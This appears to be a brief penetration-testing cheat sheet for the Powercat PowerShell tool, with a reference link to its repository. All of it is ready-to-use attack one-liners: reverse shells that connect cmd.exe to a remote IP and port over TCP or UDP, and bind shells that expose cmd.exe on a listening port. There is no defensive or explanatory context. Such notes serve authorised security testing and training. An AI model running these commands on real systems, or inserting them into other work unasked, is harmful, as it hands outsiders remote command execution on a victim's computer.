# Powercat

## Reverse shell

### TCP Method

`PS C:\> powercat -c <IP> -p <PORT> -e cmd.exe`

### UDP Method

`PS C:\> powercat -u -c <IP> -p <PORT> -e cmd.exe`

## Bind shell

### TCP Method

`PS C:\> powercat -l -p <PORT> -e cmd.exe`

### UDP Method

`PS C:\> powercat -u -l -p <PORT> -e cmd.exe`

---
## References

- [Powercat](https://github.com/besimorhino/powercat)